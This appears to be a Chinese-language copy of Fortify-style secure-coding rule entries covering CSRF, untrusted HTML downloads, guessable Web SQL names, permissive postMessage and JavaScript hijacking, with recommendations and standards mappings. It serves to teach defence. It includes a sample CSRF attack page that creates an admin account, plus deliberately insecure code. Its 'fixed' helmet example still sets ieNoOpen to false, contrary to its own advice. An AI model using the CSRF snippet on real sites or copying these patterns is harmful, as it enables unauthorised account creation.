<h5 id="EXPLANATION-4"><a href="#EXPLANATION-4" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>跨站点伪装请求 (CSRF) 漏洞会在以下情况下发生：</p>
<ol>
<li><p>Web 应用程序使用会话 cookie。</p>
</li>
<li><p>应用程序未验证请求是否经过用户同意便处理 HTTP 请求。</p>
</li>
</ol>
<p>Nonce 是随消息一起发送的加密随机值，可防止 replay 攻击。如果该请求未包含证明其来源的 nonce，则处理该请求的代码将易受到 CSRF 攻击（除非它并未更改应用程序的状态）。这意味着使用会话 cookie 的 Web 应用程序必须采取特殊的预防措施，确保攻击者无法诱骗用户提交伪请求。假设有一个 Web 应用程序，它允许管理员创建新帐户，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;POST&quot;, &quot;/new_user&quot;, true);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, new_username);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, new_passwd);</span><br><span class="line"></span><br><span class="line">req.send(body);</span><br></pre></td></tr></table></figure>
<p>攻击者可以设置一个包含以下代码的恶意网站。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var req = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">req.open(&quot;POST&quot;, &quot;http://www.example.com/new_user&quot;, true);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, &quot;attacker&quot;);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, &quot;haha&quot;);</span><br><span class="line"></span><br><span class="line">req.send(body);</span><br></pre></td></tr></table></figure>
<p>如果 example.com 的管理员在网站上具有活动会话时访问了恶意页面，则会在毫不知情的情况下为攻击者创建一个帐户。这就是 CSRF 攻击。正是由于该应用程序无法确定请求的来源，才有可能受到 CSRF 攻击。任何请求都有可能是用户选定的合法操作，也有可能是攻击者设置的伪操作。攻击者无法查看伪请求生成的网页，因此，这种攻击技术仅适用于篡改应用程序状态的请求。</p>
<p>如果应用程序通过 URL 传递会话标识符（而不是 cookie），则不会出现 CSRF 问题，因为攻击者无法访问会话标识符，也无法在伪请求中包含会话标识符。</p>
<p>CSRF 在 2007 OWASP Top 10 排行榜上名列第 5。</p>
<h5 id="RECOMMENDATIONS-4"><a href="#RECOMMENDATIONS-4" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用会话 Cookie 的应用程序必须在每个表单发布中包含几条信息，以便后端代码可以用来验证请求的来源。为此，其中一种方法就是使用一个随机请求标识符或随机数，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, &quot;/new_user&quot;);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, new_username);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, new_passwd);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, request_id);</span><br><span class="line"></span><br><span class="line">rb.sendRequest(body, new NewAccountCallback(callback));</span><br></pre></td></tr></table></figure>
<p>这样，后端逻辑可先验证请求标识符，然后再处理其他表单数据。如果可能，每个服务器请求的请求标识符都应该是唯一的，而不是在特定会话的各个请求之间共享。对于会话标识符而言，攻击者越难猜出请求标识符，则越难成功进行 CSRF 攻击。标记不应能够轻松猜出，它应以保护会话标记相同的方法得到保护，例如使用 SSLv3。</p>
<p>其他缓解技术还包括：</p>
<p>框架保护：大多数现代化的 Web 应用框架都嵌入了 CSRF 保护，它们将自动包含并验证 CSRF 标记。</p>
<p>使用质询-响应控制：强制客户响应由服务器发送的质询是应对 CSRF 的强有力防御方法。可以用于此目的的一些质询如下：CAPTCHA、密码重新验证和一次性标记。</p>
<p>检查 HTTP Referer/原始标题：攻击者在执行 CSRF 攻击时无法冒仿这些标题。这使这些标题可以用于预防 CSRF 攻击。</p>
<p>再次提交会话 Cookie：除了实际的会话 ID Cookie 外，将会话 ID Cookie 作为隐藏表单值发送是预防 CSRF 攻击的有效防护方法。服务器在处理其余表单数据之前，会先检查这些值，以确保它们完全相同。如果攻击者代表用户提交表单，他将无法根据同源策略修改会话 ID Cookie 值。</p>
<p>限制会话的有效期：当通过 CSRF 攻击访问受保护的资源时，只有当作为攻击一部分发送的会话 ID 在服务器上仍然有效时，攻击才会生效。限制会话的有效期将降低攻击成功的可能性。</p>
<p>这里所描述的技术可以使用 XSS 攻击破解。有效的 CSRF 缓解包括 XSS 缓解技术。</p>
<h5 id="REFERENCES-4"><a href="#REFERENCES-4" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Klein Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics </p>
<p>[2] OWASP 2007 OWASP Top 10 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 352 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [9] CWE ID 352 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-001941, CCI-001942 </p>
<p>[6] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-23 Session Authenticity (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 3.5.3 Token-based Session Management, 4.2.2 Operation Level Access Control, 13.2.3 RESTful Web Service Verification Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A5 Cross Site Request Forgery (CSRF) </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A5 Cross-Site Request Forgery (CSRF) </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A8 Cross-Site Request Forgery (CSRF) </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.5 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.9 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.9 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.9 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.9 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.9 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[20] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 352 </p>
<p>[21] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 352 </p>
<p>[22] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 352 </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3585 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3585 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3585 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3585 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3585 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3585 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3585 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[40] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Request Forgery </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Request Forgery (WASC-09) </p>
<h4 id="Cross-Site-Scripting-Untrusted-HTML-Downloads"><a href="#Cross-Site-Scripting-Untrusted-HTML-Downloads" class="headerlink" title="Cross-Site Scripting: Untrusted HTML Downloads"></a>Cross-Site Scripting: Untrusted HTML Downloads</h4><h5 id="ABSTRACT-5"><a href="#ABSTRACT-5" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>禁用要设置为 noopen 的 X-Download-Options 标头后，下载的 HTML 页面可以在提供这些页面的站点的安全上下文中运行。</p>
<h5 id="EXPLANATION-5"><a href="#EXPLANATION-5" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当站点需要能够为用户提供下载时，打开下载文件的选项意味着，所提供的在浏览器中运行的任何文件均可以在与站点位于相同安全上下文的当前浏览器中打开。 </p>
<p>如果攻击者能够操纵下载的文件，则他们可以插入在浏览器中运行的 HTML 或脚本作为跨站脚本攻击，从而窃取或操纵当前会话中的信息。</p>
<p>示例 1：以下示例明确禁用了对运行于浏览器中的提供的下载的保护： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">var helmet = require(&apos;helmet&apos;);</span><br><span class="line"></span><br><span class="line">app.use(helmet(&#123;</span><br><span class="line"></span><br><span class="line">    ieNoOpen: false</span><br><span class="line"></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-5"><a href="#RECOMMENDATIONS-5" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>向用户提供可能不受信任的文件，尤其是可在浏览器中运行的文件时，如果可能，站点不应允许立即打开文件。Internet Explorer 为该调用的 X-Download-Options 引入了一个标头，该标头需要设置为 noopen，以防止用户下载并立即打开文件，这样会导致文件在与站点相同的安全上下文中运行。</p>
<p>示例 2：以下示例将 X-Download-Options 标头设置为 noopen： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">var helmet = require(&apos;helmet&apos;);</span><br><span class="line"></span><br><span class="line">app.use(helmet()); //a protection enabled by default</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">//or</span><br><span class="line"></span><br><span class="line">app.use(helmet(&#123;</span><br><span class="line"></span><br><span class="line">  ieNoOpen: false</span><br><span class="line"></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>设置此标头后，Internet Explorer 用户需要在本地保存文件，然后再将其打开，这意味着该文件不会再在与提供待下载文件的站点相同的安全上下文中运行。</p>
<h5 id="REFERENCES-5"><a href="#REFERENCES-5" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [2] CWE ID 079 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 SI </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.3 Output Encoding and Injection Prevention Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS) </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS) </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS) </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A7 Cross-Site Scripting (XSS) </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.7 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079 </p>
<p>[23] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079 </p>
<p>[24] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079 </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting </p>
<p>[43] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08) </p>
<h4 id="HTML5-Easy-to-Guess-Database-Name"><a href="#HTML5-Easy-to-Guess-Database-Name" class="headerlink" title="HTML5: Easy-to-Guess Database Name"></a>HTML5: Easy-to-Guess Database Name</h4><h5 id="ABSTRACT-6"><a href="#ABSTRACT-6" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>容易猜测的 Web SQL 数据库名称可导致未经授权的人窃取数据和破坏数据库。</p>
<h5 id="EXPLANATION-6"><a href="#EXPLANATION-6" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTML5 的一项功能是在客户端 SQL 数据库存储数据。数据库名称是开始写入数据库或从数据库读取所需的重要信息。因此，数据库名称必须是每位用户特有的唯一字符串。如果数据库名称很容易被猜出，未经授权的人（例如其他用户）可能会窃取敏感数据或损坏数据库条目。</p>
<p>示例：以下代码使用了容易被猜出的数据库名称：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var db = openDatabase(&apos;mydb&apos;, &apos;1.0&apos;, &apos;Test DB&apos;, 2 * 1024 * 1024);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>该代码可成功运行，但是任何猜出数据库名称为 ‘mydb’ 的人都能够访问它。</p>
<h5 id="RECOMMENDATIONS-6"><a href="#RECOMMENDATIONS-6" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不要使用容易被猜出的数据库名称。理想情况下，应该使用随机字符串生成器来创建数据库名称并将其存储在服务器上。只有经过授权的用户登录时，才能检索该名称并将其添加到客户端脚本上。然而，这种方法可能不适用于脱机访问。相反，用户可选择脱机密码并将其与用户名一起作为数据库名称使用。</p>
<h5 id="REFERENCES-6"><a href="#REFERENCES-6" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] HTML5 Security Cheatsheet </p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 330 </p>
<p>[3] Standards Mapping - FIPS200 MP </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication </p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.3 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.3 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.3 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.3 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.3 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7 - Use of Cryptography </p>
<p>[20] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 330 </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3150.2 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3150.2 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3150.2 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3150.2 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3150.2 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3150.2 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3150.2 CAT II </p>
<p>[28] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Predictable Resource Location (WASC-34) </p>
<h4 id="HTML5-Overly-Permissive-Message-Posting-Policy"><a href="#HTML5-Overly-Permissive-Message-Posting-Policy" class="headerlink" title="HTML5: Overly Permissive Message Posting Policy"></a>HTML5: Overly Permissive Message Posting Policy</h4><h5 id="ABSTRACT-7"><a href="#ABSTRACT-7" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序发布了目标源过于宽松的跨文档消息。</p>
<h5 id="EXPLANATION-7"><a href="#EXPLANATION-7" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTML5 的一项新功能是跨文档消息传递。该功能允许脚本将消息发布到其他窗口。用户利用相应的 API 可指定目标窗口的源。不过，指定目标源时应小心谨慎，因为如果目标源过于宽松，恶意脚本就能趁机采用不当方式与受害者窗口进行通信，从而导致发生欺骗、数据被盗、转发及其他攻击。</p>
<p>示例 1：以下示例会使用通配符以编程方式指定要发送的消息的目标源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o.contentWindow.postMessage(message, &apos;*&apos;);</span><br></pre></td></tr></table></figure>
<p>使用*作为目标源的值表示无论来源如何，脚本都会将信息发送到窗口。</p>
<h5 id="RECOMMENDATIONS-7"><a href="#RECOMMENDATIONS-7" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要将 * 作为目标源的值。相反，请提供一个特定的目标源。</p>
<p>示例 2：以下代码会为目标源提供一个特定值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o.contentWindow.postMessage(message, &apos;www.trusted.com&apos;);</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-7"><a href="#REFERENCES-7" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Michael Schmidt HTML5 Web Security </p>
<p>[2] Philippe De Ryck, Lieven Desmet, Pieter Philippaerts, and Frank Piessens A Security Analysis of Next Generation Web Standards </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 942 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[5] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 14.4.6 HTTP Security Headers Requirements, 14.5.3 Validate HTTP Request Header Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication </p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[10] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[17] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<h4 id="JavaScript-Hijacking"><a href="#JavaScript-Hijacking" class="headerlink" title="JavaScript Hijacking"></a>JavaScript Hijacking</h4><h5 id="ABSTRACT-8"><a href="#ABSTRACT-8" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 JavaScript 符号来传送敏感数据的应用程序可能会存在 JavaScript hijacking 的漏洞，该漏洞允许未经授权的攻击者从一个易受攻击的应用程序中读取机密数据。</p>
<h5 id="EXPLANATION-8"><a href="#EXPLANATION-8" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果发生以下情况，应用程序可能会很容易受到 JavaScript 劫持的攻击：1) 将 JavaScript 对象用作数据传输格式 2) 处理机密数据。由于 JavaScript 劫持漏洞不会作为编码错误的直接结果出现，所以 Fortify 安全编码规则包会通过识别在 HTTP 响应中产生的 JavaScript 代码，引起人们对潜在的 JavaScript 劫持漏洞的注意。</p>
<p>Web 浏览器执行同源策略 (Same Origin Policy)，以保护用户免受恶意网站的攻击。同源策略 (Same Origin Policy) 规定：如果要使用 JavaScript 来访问某个网页的内容的话，则 JavaScript 和网页必须都来源于相同的域。若不采取同源策略 (Same Origin Policy)，恶意网站便可以使用客户端凭证来运行 JavaScript，从其他网站加载的敏感信息，并对这些信息进行提炼，然后将其返回给攻击者。通过 JavaScript 劫持，攻击者可以绕过 Web 应用程序中使用的同源策略 (Same Origin Policy)，该应用程序使用 JavaScript 来交流机密信息。同源策略 (Same Origin Policy) 中的漏洞是：通过这一策略，任何网站的 JavaScript 都可以被其他网站的上下文包含或执行。即使恶意网站不能直接在客户端上检查易受攻击的站点中加载的所有数据，但它仍可以通过配置一个特定的环境利用该漏洞。有了这样的环境，恶意网站就可以监视 JavaScript 的执行过程和任何可能发生的相关负面效应。由于许多 Web 2.0 应用程序使用 JavaScript 作为数据传输机制，因此，与传统的 Web 应用程序不同，它们往往很容易受到各种攻击。</p>
